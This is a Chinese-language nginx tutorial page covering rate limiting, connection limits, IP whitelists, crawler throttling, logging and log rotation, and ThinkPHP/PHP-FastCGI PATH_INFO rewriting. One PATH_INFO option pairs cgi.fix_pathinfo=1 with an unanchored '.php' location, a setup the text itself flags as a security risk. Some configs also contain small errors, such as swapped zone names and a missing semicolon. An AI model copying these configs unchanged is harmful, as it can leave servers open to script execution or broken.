  limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
  server {
    location /search/ {
      limit_req zone=one burst=5 nodelay;
    }
}

# 限制访问速率
# 限制了每个IP访问的速度为2r/s,并将该规则作用于根目录。如果单个IP在非常短的时间内并发发送多个请求,例如单个IP在10ms内发并发送了6个请求,只有1个成功,剩下的5个都被拒绝,是因为Nginx的限流统计是基于毫秒的,设置的速度是2r/s,转换一下就是500ms内单个IP只允许通过1个请求,从501ms开始才允许通过第二个请求。
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=2r/s;
server {
  location / {
    limit_req zone=mylimit;
  }
}

# burst=4表示每个key(此处是每个IP)最多允许4个突发请求的到来。如果单个IP在10ms内发送6个请求,相比实例一成功数增加了4个,这个设置的burst数目是一致的。具体处理流程是：1个请求被立即处理,4个请求被放到burst队列里,另外一个请求被拒绝。通过burst参数使得Nginx限流具备了缓存处理突发流量的能力。
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=2r/s;
server {
  location / {
    limit_req zone=mylimit burst=4;
  }
}

# 单个IP 10ms内并发发送6个请求,跟实例二相比,请求成功率没变化,但总体耗时变短了
# 实例二中有4个请求被放到burst队列当中,工作进程每隔500ms(rate=2r/s)取一个请求进行处理,最后一个请求要排队2s才会被处理;
# 实例三中请求放入队列跟实例二是一样的,但不同的是队列中的请求同时具有了被处理的资格,所以实例三中的5个请求可以说是同时开始被处理的,花费时间自然变短了。
# 虽然设置burst和nodelay能够降低突发请求的处理时间,但长期来看并不会提高吞吐量的上限,长期吞吐量的上限是由rate决定的,因为nodelay只能保证burst的请求被立即处理,但Nginx会限制队列元素释放的速度,就像是限制了令牌桶中令牌产生的速度。
# 加入了nodelay参数之后的限速算法,还算是漏桶算法。考虑一种情况,令牌桶算法的token为耗尽时会怎么做呢？由于它有一个请求队列,所以会把接下来的请求缓存下来,缓存多少受限于队列大小。但此时缓存这些请求还有意义吗？如果server已经过载,缓存队列越来越长,RT越来越高,即使过了很久请求被处理了,对用户来说也没什么价值了。所以当token不够用时,最明智的做法就是直接拒绝用户的请求,这就成了漏桶算法。
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=2r/s;
server {
  location / {
    limit_req zone=mylimit burst=4 nodelay;
  }
}

# 自定义返回值
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=2r/s;
server {
  location / {
    limit_req zone=mylimit burst=4 nodelay;
    limit_req_status 598;
  }
}

</textarea><pre>
【 ngx_http_limit_conn_module参数配置 】
这个模块用来限制单个IP的请求数,并非所有的连接都被计数,只有在服务器处理了请求并且已经读取了整个请求头时连接才被计数。
限制并发: 限制ip并发数,也是说限制同一个ip同时连接服务器的数量。

Syntax: limit_conn_zone key zone=name:size;
Default:    —
Context: http

limit_conn_zone $binary_remote_addr zone=addr:10m;
客户端IP地址作为key,不是$remote_addr,而是使用$binary_remote_addr变量。$remote_addr变量的大小可以从7到15个字节不等。存储的状态在32位平台上占用32或64字节的内存,在64位平台上总是占用64字节。对于IPv4地址$binary_remote_addr变量的大小始终为4个字节,对于IPv6地址则为16个字节。一个兆字节的区域可以保持大约32000个32字节的状态或大约16000个64字节的状态。如果区域存储耗尽,服务器会将错误返回给所有其他请求。

Syntax: limit_conn zone number;
Default:  —
Context: http,server,location

Syntax: limit_conn_log_level info | notice | warn | error;
Default:
limit_conn_log_level error;
Context: http,server,location
当服务器限制连接数时,设置所需的日志记录级别。

Syntax: limit_conn_status code;
Default:
limit_conn_status 503;
Context: http,server,location
设置拒绝请求的返回值。

</pre><textarea>limit_conn_zone $binary_remote_addr zone=one:10m;  # 定义一个名为one的limit_zone大小10M内存来存储session,以$binary_remote_addr为key
server{
  location {
    limit_conn one 20;		 # 连接数限制
    limit_rate 500k;		   # 带宽限制,对单个连接限数,如果一个ip两个连接就是500x2k
  }
}

limit_conn_zone $binary_remote_addr zone=addr:10m;
server {
  location /download/ {
    limit_conn addr 1;    # 一次只允许每个IP地址一个连接
  }
}

# 可以配置多个limit_conn指令,例如以下配置将限制每个客户端IP连接到服务器的数量,同时限制连接到虚拟服务器的总数
limit_conn_zone $binary_remote_addr zone=perip:10m;
limit_conn_zone $server_name zone=perserver:10m;
server {
  ...
  limit_conn perip 10;
  limit_conn perserver 100;
}

</textarea>

<h4>nginx限速白名单配置</h4><pre>
不希望对某些IP进行限制,如反代服务器IP、公司IP等,可将特定的IP加入到白名单中,需要结合geo和map指令来实现

</pre><textarea>http {
  # geo指令定义一个白名单$whiteiplist,默认值为1,所有都受限制。如果客户端IP与白名单列出的IP相匹配,则$whiteiplist值为0也就是不受限制
  geo $whiteiplist  {
    default 1;
    127.0.0.1 0;
    10.0.0.0/8 0;
    121.207.242.0/24 0;
  }
  
  # map指令是将$whiteiplist值为1的,也就是受限制的IP,映射为客户端IP。将$whiteiplist值为0的,也就是白名单IP,映射为空的字符串
  map $whiteiplist  $limit {
    1 $binary_remote_addr;
    0 "";
  }

  # limit_conn_zone和limit_req_zone指令对于键为空值的将会被忽略,从而实现对于列出来的IP不做限制
  limit_conn_zone $limit zone=limit:10m;

  server {
    listen       8080;
    server_name  test.ttlsa.com;

    location ^~ /ttlsa.com/ {
      limit_conn limit 4;
      limit_rate 200k;
      alias /data/www.ttlsa.com/data/download/;
    }
  }
}

# 测试方法：
ab -c 100 -n 300 http://test.ttlsa.com:8080/ttlsa.com/docs/pdf/nginx_guide.pdf

</textarea>

<h4>nginx针对爬虫进行限速配置</h4><pre>
网络爬虫一方面可以给网站带来一定的流量,便于搜索引擎收录,利于用户搜素,同时也会给服务器带来一定的压力,在网络爬虫对网站内容进行收录时会引起服务器负载高涨。有没有什么方法既不阻止网络爬虫对网站内容进行收录,同时对其连接数和请求数进行一定的限制呢？

robots.txt(也称为爬虫协议、爬虫规则、机器人协议等)是放置在网站根目录中的.TXT文件,是搜索引擎蜘蛛程序默认访问网站第一要访问的文件,如果搜索引擎蜘蛛程序找到这个文件,它就会根据这个文件的内容来确定它访问权限的范围。robots.txt将告诉搜索引擎蜘蛛程序网站哪些页面时可以访问,哪些不可以。Robots协议是网站国际互联网界通行的道德规范,其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯。因其不是命令,故需要搜索引擎自觉遵守。

robots.txt写法：
User-agent: * 通配符*代表的所有的搜索引擎种类
Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的内容
Disallow: /require/ 这里定义是禁止爬寻require目录下面的内容

</pre>限制特定UA比如搜索引擎的访问<textarea>limit_req_zone $anti_spider zone=one:10m rate=10r/s;
limit_req zone=one burst=100 nodelay;
if ($http_user_agent ~* "googlebot|bingbot|Feedfetcher-Google") {
  set $anti_spider $http_user_agent;
}

</textarea>对爬虫进行限速处理实现方法<textarea>http {
  map $http_user_agent $agent {
    default       "";
    ~curl         $http_user_agent;
    ~*apachebench $http_user_agent;
    ~*spider      $http_user_agent;
    ~*bot         $http_user_agent;
    ~*slurp       $http_user_agent;
  }

  limit_conn_zone $agent zone=conn_ttlsa_com:10m;
  limit_req_zone $agent zone=req_ttlsa_com:10m rate=1r/s;

  server {
    listen       8080;
    server_name  test.ttlsa.com;
    root /data/webroot/www.ttlsa.com/

    location   / {
      limit_req zone=conn_ttlsa_com burst=5;
      limit_conn req_ttlsa_com 1;
      limit_rate 500k;
    }
  }
}

测试：
# ab -c 10 -n 300 http://test.ttlsa.com:8080/www.ttlsa.com.html

</textarea>
</div>

<div id="nginx_debug">
<h3>nginx调试优化</h3><pre>
【 ngx_http_log_module模块访问日志配置 】
通过访问日志可以查用户的地址,网站的哪些部分最受欢迎,用户的浏览时间,对大多数用户用的的浏览器做出针对性优化
Nginx把每个用户访问往日志信息记录到指定的日志文件里,供网站管理员分析用户浏览行为等,此功能由ngx_http_log_module模块负责

Nginx访问日志主要有两个参数控制,一般场景这些参数都无需配置,极端优化才有可能会考虑这些参数。
log_format  #用来定义记录日志的格式,可以定义多种日志格式,取不同名字即可
access_log  #用来指定日至文件的路径及使用的何种日志格式记录日志

【 access_log指令 】
Syntax:   access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]];
          access_log off;  #关闭access_log,即不记录访问日志
Default:  access_log logs/access.log combined;
Context:  http,server,location,if in location,limit_except
访问日志文件路径,格式名称以及缓存大小和刷写时间间隔;建议定义缓冲以提升性能;

access_log参数：
buffer=size       #存放访问日志的缓冲区大小
flush=time        #为缓冲区的日志刷到磁盘的时间
gzip[=level]      #表示压缩级别
[if = condition]  #表示其他条件

【 log_format指令 】
Syntax:   log_format name [escape=default|json|none] string ...;
Default:  log_format combined '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent"';
Context:  http

【 自定义日志格式 】
log_format格式变量：
$remote_addr         # 记录客户端IP地址
$remote_user         # 远程客户端用户名
$time_local          # 记录访问时间与时区
$request             # 用户的http请求起始行信息
$status              # http状态码,记录请求返回的状态码,例如：200、301、404等
$connection          # 连接的序列号。
$connection_requests # 当前通过一个连接获得的请求数量。
$body_bytes_sent     # 服务器发送给客户端的响应body字节数
$bytes_sent          # 发送给客户端的总字节数。
$http_referer        # 记录此次请求是从哪个连接访问过来的,可以根据该参数进行防盗链设置。
$http_user_agent     # 记录客户端访问信息,例如：浏览器、手机客户端等
$http_x_forwarded_for  #当前端有代理服务器时设置web节点记录客户端地址的配置,此参数生效的前提是代理服务器也要进行相关的x_forwarded_for设置
$msec           日志写入时间,单位为秒,精度是毫秒。
$pipe           如果请求是通过HTTP流水线(pipelined)发送,pipe值为"p",否则为"."。
$request_length 请求的长度(包括请求行,请求头和请求正文)。
$request_time   请求处理时间,单位为秒,精度毫秒;从读入客户端的第一个字节到把最后一个字符发送给客户端后进行日志写入为止。
$time_iso8601   ISO8601标准格式下的本地时间。
$time_local     通用日志格式下的本地时间。

</pre><textarea>log_format  access  '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';

log_format  error  '$http_x_forwarded_for - $remote_user [$time_local] "$request" '
                   '"$status" $body_bytes_sent "$http_referer" '
                   '"$http_user_agent" "$http_x_forwarded_for" '
                   '"$gzip_ratio" $request_time $bytes_sent $request_length';

log_format  customLog "$remote_addr^A$remote_user^A$time_local^A$request_method^A$uri^A$args^A$server_protocol"
                   "^A$status^A$body_bytes_sent^A$http_referer"
                   "^A$http_user_agent";
access_log /path/logs/access.log customLog;

上面例子中通过使用特殊字符(^A)来作为日志字段的分隔符,用户后续可以使用sort和grep之类的工具对特定url做分析,如统计各url请求量倒排取前50个：
awk -F^A '{print $5}' /path/logs/access.log | sort | uniq -c | sort -nr | head -50

</textarea><pre>
【 error_log指令 】
配置错误日志
Syntax:   error_log file [level];
Default:  error_log logs/error.log error;
Context:  main,http,mail,stream,server,location
level:debug,info,notice,warn,error,crit,alert,or emerg

</pre><textarea># 在配置文件不同block中是允许重新定义错误日志的,但当用户在重新定义错误日志时,如果没有指定相应的日志级别,调试日志将会被屏蔽
error_log  /path/to/log  debug;
http {
  server {
    error_log  /path/to/log;   #会被屏蔽,可以加debug
  }
}

# 配置error_log off并不能关闭日志记录——日志信息会被写入到文件名为off的文件当中,如果要关闭日志记录可以做如下配置：
error_log /dev/null crit;

# 通过debug_connection配置项可以针对某些地址开启调试日志：
error_log  /path/to/log;
events {
  debug_connection   10.232.10.1;
  debug_connection   10.232.10.0/24;
}

</textarea><textarea>worker_processes  1;
error_log logs/error.log error;
events {
  worker_connections  1024;
}
http {
  include status.conf;
  include       mime.types;
  default_type  application/octet-stream;
  sendfile        on;
  keepalive_timeout  65;
  log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
  access_log  logs/access.log  main;
  server {
    listen       80;
    server_name  localhost;
    rewrite ^/.* http://www.abc.com permanent;
  }
  include vhost/*.conf;
}

</textarea><textarea>server {
  access_log /data/log/www;
  listen 80;
  server_name abc.com www.abc.com;
  location / {
    root /data/www/www;
    index index.html index.htm;
  }
  error_log    logs/error_www.abc.com.log    error;
  access_log    logs/access_www.abc.com.log    main;
  #新增内容↑
}

</textarea><pre>
【 open_log_file_cache指令 】
对于每一条日志记录都将是先打开文件再写入日志然后关闭,可使用open_log_file_cache设置日志文件缓存
语法: open_log_file_cache max=N [inactive=time] [min_uses=N] [valid=time];
默认值: open_log_file_cache off;
配置段: http,server,location

参数
max:设置缓存中的最大文件描述符数量,如果缓存被占满则采用LRU算法将描述符关闭。
inactive:设置存活时间,默认10s
min_uses:设置在inactive时间段内,日志文件最少使用多少次后该日志文件描述符记入缓存中,默认1次
valid:设置检查频率,默认60s
off：禁用缓存

open_log_file_cache max=1000 inactive=20s valid=1m min_uses=2;

【 log_not_found指令 】
Syntax:  log_not_found on | off;
Default: log_not_found on;
Context: http,server,location
Enables or disables logging of errors about not found files into error_log

【 log_subrequest指令 】
是否在access_log中记录子请求的访问日志
语法: log_subrequest on | off;
默认值: log_subrequest off;
配置段: http,server,location

【 rewrite_log指令 】
ngx_http_rewrite_module模块提供的,用来记录重写日志的,对于调试重写规则建议开启
语法: rewrite_log on | off;
默认值: rewrite_log off;
配置段: http,server,location,if
启用时将在error log中记录notice级别的重写日志。

【 nginx日志切割 】
nginx日志默认写入到一个文件中,文件会变的越来越大,不方便查看分析。通常是以每日来做统计的,以日期来作为日志的切割

1. 定义日志轮滚策略
/data/weblogs/*.log使用通配符时/data/weblogs/目录下的所有匹配到的日志文件都将切割,如要切割特定日志文件就指定到该文件
# vim nginx-log-rotate
/data/weblogs/*.log {
  nocompress
  daily
  copytruncate
  create
  notifempty
  rotate 7
  olddir /data/weblogs/old_log
  missingok
  dateext
  postrotate
  /bin/kill -HUP `cat /var/run/nginx.pid 2> /dev/null` 2> /dev/null || true
  endscript
}

2. 设置计划任务,每天23点59分钟执行日志切割
# vim /etc/crontab
59 23 * * * root ( /usr/sbin/logrotate -f /PATH/TO/nginx-log-rotate)

</pre>
</div>

<div id="nginx_thinkphp">
<h4>ThinkPHP nginx配置文件</h4><pre>
URL设计
TP5.1在没有定义路由的情况下典型的URL访问规则是：
http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]
支持切换到命令行访问,如果切换到命令行模式下面的访问规则是：
>php.exe index.php 模块/控制器/操作/[参数名/参数值…]
无论是URL访问还是命令行访问都采用PATH_INFO访问地址,其中PATH_INFO的分隔符是可以设置的。

普通模式的URL访问不再支持,但参数可以支持普通方式传值
>php.exe index.php 模块/控制器/操作?参数名=参数值&…

如果不支持PATHINFO的服务器可以使用兼容模式访问如下：
http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]

URL重写
可以通过URL重写隐藏应用的入口文件index.php
Nginx低版本不支持PATHINFO,但可通过在Nginx.conf中配置转发规则实现,其实内部是转发到了TP提供的兼容URL,利用这种方式可以解决其他不支持PATHINFO的WEB服务器环境
location / {
  if (!-e $request_filename) {
    rewrite  ^(.*)$  /index.php?s=/$1  last;
  }
}

原来的访问URL：http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]
设置后的方式访问：http://serverName/模块/控制器/操作/[参数名/参数值...]

如果没有修改服务器的权限,可以在index.php入口文件做修改,这不是正确的做法,并且不一定成功,视服务器而定,只是在框架执行前补全$_SERVER['PATH_INFO']参数
$_SERVER['PATH_INFO'] = $_SERVER['REQUEST_URI' ];

</pre><textarea>server {
  listen       8887;
  server_name  127.0.0.1;
  root         E:/wamp/tp5;

  location / {
    index  index.html index.htm index.php;
    if (!-e $request_filename) {
      rewrite  ^(.*)$  /index.php?$1  last;
      break;
    }
  }

  # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
  location ~ \.php$ {
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;
  }
}

</textarea>THINKPHP5 NGINX通用配置<textarea>server {
  listen 80;  #配置监听端口
  listen [::]:80;
  server_name www.example123.com;  #设置域名    
  set $root /var/www/web;  #设置网站根目录作为变量root
  root $root;   #设置网站根目录
  #access_log logs/access.log;  #设置访问日志存放路径
  #error_log  logs/error.log;  #设置错误日志存放路径
  index index.html index.php;  #设置网站默认首页
  charset utf-8;  #设置字符集

  #此配置用于静态文件配置
  #location /static {
    #try_files $uri $uri/ =404;
  #}

  #配置PHP的重写规则
  location / {
    #开启目录浏览功能
    #autoindex on;
    #关闭详细文件大小统计,让文件大小显示MB,GB单位,默认为b
    #autoindex_exact_size on;
    #开启以服务器本地时区显示文件修改日期
    #autoindex_localtime on;
    if ( !-e $request_filename) {
      rewrite ^/(.*)$ /index.php/$1 last;
      break;
    } 
  }

  #配置PHP的pathinfo
  location ~ .+\.php($|/) {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index index.php;
    fastcgi_split_path_info ^((?U).+.php)(/?.+)$;  # fastcgi_split_path_info指令让nginx支持pathinfo
    fastcgi_param PATH_INFO $fastcgi_path_info;
    fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;
    fastcgi_param SCRIPT_FILENAME $root$fastcgi_script_name;
    include fastcgi_params;
  }
}

</textarea><textarea>server {
  listen       80;
  server_name  thinkphp.lo;
  root /var/www;
  index  index.html index.htm index.php;
  
  error_page  404              /404.html;
  location = /404.html {
    return 404 'Sorry,File not Found!';
  }
  
  error_page  500 502 503 504  /50x.html;
  location = /50x.html {
    root   /usr/share/nginx/html;
  }
  
  # fastcgi_split_path_info指令让nginx支持pathinfo,不需要增加location @rewrite指令段变相来解决
  location / {
    try_files $uri @rewrite;
  }
  
  location @rewrite {
    set $static 0;
    if  ($uri ~ \.(css|js|jpg|jpeg|png|gif|ico|woff|eot|svg|css\.map|min\.map)$) {
      set $static 1;
    }
    if ($static = 0) {
      rewrite ^/(.*)$ /index.php?s=/$1;
    }
  }
  
  location ~ /Uploads/.*\.php$ {
    deny all;
  }
  
  location ~ \.php/ {
    if ($request_uri ~ ^(.+\.php)(/.+?)($|\?)) { }
    fastcgi_pass 127.0.0.1:9000;
    include fastcgi_params;
    fastcgi_param SCRIPT_NAME     $1;
    fastcgi_param PATH_INFO       $2;
    fastcgi_param SCRIPT_FILENAME $document_root$1;
  }
  
  location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
  }
  
  location ~ /\.ht {
    deny  all;
  }
}

</textarea><pre>
【 Nginx(PHP/fastcgi)的PATH_INFO配置 】
pathinfo不是nginx的功能,pathinfo是php的功能。
php有两个pathinfo: 环境变量$_SERVER['PATH_INFO']和以数组的形式返回文件路径信息的pathinfo()函数,nginx只对$_SERVER['PATH_INFO]值的设置。
PHP的全局变量$_SERVER['PATH_INFO'],PATH_INFO是一个CGI1.1的标准,经常用来作为传参载体,被很多系统用来优化url路径格式,最著名的如TP框架

对于下面网址：
http://www.test.cn/index.php/test/my.html?c=index&m=search
$_SERVER['PATH_INFO']＝'/test/my.html',$_SERVER['QUERY_STRING']='c=index&m=search';

如果不借助高级方法,php中http://www.test.com/index.php?type=search这样的URL很常见,不太美观,而且对于搜索引擎也是非常不友好的,实际上有没有影响未知,因为现在的搜索引擎已经很智能了,可以收入带参数的后缀网页,不过出于整洁的考虑还是想希望能够重写URL

</pre>解析利用PATH_INFO的进行重写<textarea>if(!isset($_SERVER['PATH_INFO'])){
  $pathinfo = 'default';
}else{
  $pathinfo = explode('/', $_SERVER['PATH_INFO']);
}
if(is_array($pathinfo) && !empty($pathinfo)){
  $page = $pathinfo[1];
}else{
  $page = 'default.php';
}

</textarea><pre>
php.ini的配置参数cgi.fix_pathinfo是用来对设置cgi模式下为php是否提供绝对路径信息或PATH_INFO信息,默认值是1
没有这个参数之前PHP设置绝对路径PATH_TRANSLATED的值为SCRIPT_FILENAME,没有PATH_INFO值
设置这个参数为cgi.fix_pathinfo=1后,cgi设置完整的路径信息PATH_TRANSLATED的值为SCRIPT_FILENAME,并且设置PATH_INFO信息
如果设为cgi.fix_pathinfo=0则只设置绝对路径PATH_TRANSLATED的值为SCRIPT_FILENAME

nginx默认不会设置PATH_INFO环境变量,需要php使用cgi.fix_pathinfo=1来完成路径信息的获取,但同时会带来安全隐患,需要把cgi.fix_pathinfo=0设置为0,这样php就获取不到PATH_INFO信息,那些依赖PATH_INFO进行URL美化的程序就失效了

</pre><textarea>1.可以通过rewrite方式代替php中的PATH_INFO
实例：thinkphp的pathinfo解决方案,设置URL_MODEL=2,url的兼容模式
location / {
  if (!-e $request_filename){
    rewrite ^/(.*)$ /index.php?s=/$1 last;
  }
}

2.nginx配置文件中设置PATH_INFO值
请求的网址是/abc/index.php/abc,PATH_INFO的值是/abc
SCRIPT_FILENAME的值是$doucment_root/abc/index.php
SCRIPT_NAME /abc/index.php

旧版本的nginx配置方式
location ~ .php($|/) {
  set $script $uri;
  set $path_info "";

  if ($uri ~ "^(.+.php)(/.+)") {
    set $script $1;
    set $path_info $2;
  }

  fastcgi_pass 127.0.0.1:9000;
  fastcgi_index index.php;
  fastcgi_param SCRIPT_FILENAME $document_root$script;
  fastcgi_param SCRIPT_NAME $script;
  fastcgi_param PATH_INFO $path_info;
}

新版本的nginx也可以使用fastcgi_split_path_info指令来设置PATH_INFO,旧的方式不再推荐使用,在location段添加如下配置。
location ~ ^.+.php {
  (...)
  fastcgi_split_path_info ^((?U).+.php)(/?.+)$;
  fastcgi_param PATH_INFO $fastcgi_path_info;
  fastcgi_param SCRIPT_FILENAME /path/to/php$fastcgi_script_name;
  fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;
  (...)
}

</textarea><pre>
为什么apache不会出现这个问题？
apache一般是以模块的方式运行php,apache可以对$_SERVER['PATH_INFO']的值进行设置,不需要另外配置

在Apache中当不加配置时对于PHP脚本AcceptPathInfo是默认接受的,而对于Nginx下是不支持PATHINFO的,也就是需要设置才能使用PATHINFO模式
可以使用PATH_INFO来代替Rewrite来实现伪静态页面,很多PHP框架也使用PATHINFO模式来作为路由载体

Apache默认设置PATHINFO原理分析
对于请求 http://wangying.sinaapp.com/tools/index.php/login/index
Apache都接受,都会认为是对index.php的访问,并会设置PATH_INFO为'/login/index'
print_r($_SERVER["PATH_INFO"]);  // login/index

</pre>nginx模拟PATH_INFO<textarea>Nginx是通过对文件名的扩展名匹配决定是否要交给php cgi服务器去解释的,在nginx.conf中一般都有如下的默认配置段:

location ~ .php$ {
  fastcgi_index index.php;
  fastcgi_pass 127.0.0.1:9000;
  include fastcgi_params;
}

对于形如tools/index.php/login/index的文件路径,Nginx正则匹配为路径而不是php文件,所以需要去掉($)改写这段配置匹配扩展名:

location ~ .php {
  fastcgi_index index.php;
  fastcgi_pass 127.0.0.1:9000;
  include fastcgi_params;
}

</textarea>现在脚本路径已经交由PHP自己处理了,那怎么增加PATH_INFO呢?<textarea>方案一：php内置解析
需要打开PHP中cgi.fix_pathinfo配置项,打开这个配置项以后PHP会去根据CGI规范来检查SCRIPT_FILENAME中那部分是访问脚本和PATH_INFO(ini配置解释),并根据SCRIPT_NAME来修改PATH_INFO(和PATH_TRANSLATED)为正确的值,然后就只要添加一个FASTCGI_PARAM项就好了:

location ~ .php {
  fastcgi_index index.php;
  fastcgi_pass 127.0.0.1:9000;
  include fastcgi_params;
  fastcgi_param PATH_INFO $fastcgi_script_name;
}

方案二：nginx正则解析
上面的解决方法,把对路径的分析交给了PHP去处理,下面是由Nginx来分析路径(也就不需要fix_pathinfo),两种配置方案
配置方案 使用nginx模块fastcgi_split_path_info (nginx版本>0.7.31)

location ~ \.php {
  fastcgi_pass   127.0.0.1:9000;
  fastcgi_index  index.php;
  include        fastcgi_params;  # 先加载默认后解析赋值
  fastcgi_split_path_info ^((?U).+\.php)(/?.+)$;  #正则解析路径
  fastcgi_param  PATH_INFO        $fastcgi_path_info;
  fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
}

/*
fastcgi_split_path_info
语法：fastcgi_split_path_info regex
使用字段：location
可用版本：0.7.31以上
这个指令允许为CGI specification设置SCRIPT_FILENAME、SCRIPT_NAME、PATH_INFO变量,正则包含两个组:
处理请求的脚本路径对应$fastcgi_script_name
脚本参数的值对应$fastcgi_path_info
示例请求"/show.php/article/0001"的参数SCRIPT_FILENAME将设置为"/path/to/php/show.php",参数PATH_INFO为"/article/0001"
*/
location ~ ^.+\.php {
  (...)
  fastcgi_split_path_info ^(.+\.php)(.*)$;
  fastcgi_param PATH_INFO       $fastcgi_path_info;
  fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;
  (...)
}

# 配置方案2
# 由于nginx内建只读变量$fastcgi_script_name无法赋值,所有通过设置$real_script_name变量来做中间值
location ~ \.php {
  fastcgi_pass   127.0.0.1:9000;
  fastcgi_index  index.php;
  include        fastcgi_params;  #先加载默认后解析赋值
  set $path_info "";              #正则解析路径
  set $real_script_name $fastcgi_script_name;
  if ($fastcgi_script_name ~ "^(.+?\.php)(/.+)$") {
    set $real_script_name $1;
    set $path_info $2;
  }
  fastcgi_param PATH_INFO       $path_info;
  fastcgi_param SCRIPT_FILENAME $document_root$real_script_name;
  fastcgi_param SCRIPT_NAME     $real_script_name;
}

/*nginx 把nginx解析url变量赋值给fastcgi_param,php通过$_SERVER获取fastcgi_param中的所有变量值 */
Array
(
[USER] => www
[HOME] => /home/www
[FCGI_ROLE] => RESPONDER
[QUERY_STRING] =>
[REQUEST_METHOD] => GET
[CONTENT_TYPE] =>
[CONTENT_LENGTH] =>
[SCRIPT_NAME] => /demos/doitnote/index.php  //重点关注
[REQUEST_URI] => /demos/doitnote/index.php/login/index
[DOCUMENT_URI] => /demos/doitnote/index.php/login/index
[DOCUMENT_ROOT] => /mnt/hgfs/vmhtml/doitphp
[SERVER_PROTOCOL] => HTTP/1.1
[GATEWAY_INTERFACE] => CGI/1.1
[SERVER_SOFTWARE] => nginx/1.1.19
[REMOTE_ADDR] => 192.168.127.1
[REMOTE_PORT] => 60422
[SERVER_ADDR] => 192.168.127.10
[SERVER_PORT] => 80
[SERVER_NAME] => www.doitphp.loc
[REDIRECT_STATUS] => 200
[PATH_INFO] => /login/index  //重点关注
[SCRIPT_FILENAME] => /mnt/hgfs/vmhtml/doitphp/demos/doitnote/index.php  //重点关注
[HTTP_HOST] => www.doitphp.loc
[HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0
[HTTP_ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
[HTTP_ACCEPT_LANGUAGE] => zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
[HTTP_ACCEPT_ENCODING] => gzip,deflate
[HTTP_CONNECTION] => keep-alive
[HTTP_REFERER] => http://www.doitphp.loc/demos/doitnote/
[HTTP_CACHE_CONTROL] => max-age=0
[PHP_SELF] => /demos/doitnote/index.php/login/index
[REQUEST_TIME] => 1354246274
)

</textarea><pre>
【 nginx下基于TP框架的网站url重写 】
TP有三种url模式,在windows下面使用.htaccess路径重写,在linux+nginx环境下修改nginx.conf或对应的nginx配置文件
TP框架基于MVC思想,模块化的设计并采用了单一入口模式,这样为nginx下的url重写免去了不少麻烦。
nginx下的基于TP的应用的url重写,需了解TP的各种url格式参数的处理逻辑及nginx重写的原理。
简单点说,无论哪种url格式nginx都需要执行TP下的应用单一入口文件,然后将各种url格式按照一定的格式规则进行进行参数化处理,最终执行指定模块与控制器;这个过程用户是看不到的,用户只能看到各种规则的url,这些url的规则如下：

第一种 普通get多参数方式
htt://blog.jjonline.cn/index.php?m=Info&a=usrInfo

第二种 pathinfo方式
htt://blog.jjonline.cn/index.php/Info/usrInfo
htt://blog.jjonline.cn/index.php/Info/usrInfo/Id/1

第三种 普通get单参数方式 TP中又称"兼容模式"
htt://blog.jjonline.cn/index.php?s=Info/usrInfo
htt://blog.jjonline.cn/index.php?s=Info/usrInfo/Id/1

当然这三种模式还可以附带文件后缀,其实合并起来也就3种,附带后缀只是上述三种规则的细微变化
TP框架核心代码获取到以上三种模式的参数后会进行特定的处理,带不带后缀,带哪种后缀均可配置,也就是如下几种规则

第一种
htt://blog.jjonline.cn/index.php/Info/usrInfo.html
第二种
htt://blog.jjonline.cn/index.php?s=Info/usrInfo.html

print_r(pathinfo('http://blog.jjonline.cn/test/index.txt'));
Array
(
 [dirname] => http://blog.jjonline.cn/test
 [basename] => index.txt
 [extension] => txt
 [filename] => index
)

TP就采用了这种思想,将单一入口的url传参格式化,典型的基于TP的url示例如下：
http://blog.jjonline.cn/index.php/Usr/UsrInfo
上述格式化的url形式就是TP需要支持的pathinfo路径模式,访问这个地址对基于TP框架的网站来说,实际需要执行的就是网站根目录下的index.php文件,而该url中后面的/Usr/UsrInfo则被作为mvc思路中的功能模块参数与控制器参数,转换为普通get方式传参则上述url就要变为：
http://blog.jjonline.cn/index.php?m=Usr&a=UsrInfo

有了这种思路,nginx的url重写就有了最原始的写法,对于上述pathinfo的格式化url,nginx不做url重写时会把它当做一个路径执行,所以第一种url重写出现了：
location / {
  root /var/www;
  index index.html index.htm index.php;
  if (!-d $request_filename) {
    rewrite ^/(.*)/(.*)/*$  /index.php?m=$1&a=$2  last;
    break;
  }
}

但问题出现了,基于ThinkPHP的应用不仅只有上述例子中的这种pathinfo模式,现在变成这样的
第一种,未隐藏index.php 但url路径中有.html后缀
http://blog.jjonline.cn/index.php/Usr/UsrInfo.html

第二种,隐藏脚本文件index.php
http://blog.jjonline.cn/Usr/UsrInfo
http://blog.jjonline.cn/Usr/UsrInfo/

